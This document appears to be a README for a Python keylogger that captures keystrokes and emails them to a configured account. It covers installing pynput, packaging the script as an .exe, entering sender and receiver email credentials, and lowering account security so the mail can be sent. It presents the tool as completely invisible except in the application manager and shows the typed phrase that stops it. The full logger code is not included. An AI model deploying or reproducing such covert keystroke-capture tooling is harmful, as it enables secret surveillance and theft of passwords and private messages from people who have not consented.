# Keylogger
A keylogger with email sending funtionality

## Instalation 
You must have python installed in the computer<br>
You must install pynput library
```bash
pip install pynput
```
If you can't install this stuff you can convert the script into a single .exe file by following this [video](https://www.youtube.com/watch?v=Vr9vl0qlggE) 


## Usage
You have to edit the script to introduce the information to link your email, you have to fill this variables with the requested information

```python
User = 'Input the sender email account' 
Receptor = 'Input the receiver email account'
Password = 'Input the sender email account Password'
```

## Email permision

If you just run the scipt it wont work, you have to give permission to unsafe application<br>
manage your account >> security >>unsafe application access >> yes

## How to close it

The script will be completely invisible except in the application manager<br>
You can close the script by shutting down the computer or writting down (close keylogger) anywhere and it will stop executing as described in the following lines:
```python
elif str(key) == "Key.enter":
        
    if text == ["'c'", "'l'", "'o'", "'s'", "'e'", ' ', "'k'", "'e'", "'y'", "'l'", "'o'", "'g'", "'g'", "'e'", "'r'"]:
        finish()
```
